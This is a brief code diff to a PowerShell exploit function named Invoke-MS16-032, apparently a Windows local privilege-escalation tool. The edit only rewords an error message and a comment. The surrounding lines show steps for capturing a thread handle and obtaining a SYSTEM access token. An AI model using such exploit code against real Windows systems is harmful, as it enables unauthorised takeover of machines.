@@ -279,7 +279,7 @@ function Invoke-MS16-032 {
 	
 	# If no thread handle is captured, the box is patched
 	if (!$hThread) {
-		echo "[!] No valid thread handles were captured, exiting!`n"
+		echo "[!] No valid thread handle was captured, exiting!`n"
 		Return
 	} else {
 		echo "[?] Done, using thread handle: $hThread"
@@ -288,7 +288,7 @@ function Invoke-MS16-032 {
 	# Get handle to SYSTEM access token
 	Get-SystemToken
 	
-	# If we fail a check in Get-SystemToken, skip loop
+	# If we fail a check in Get-SystemToken, exit
 	if ($SysTokenHandle -eq 0) {
 		Return
 	}
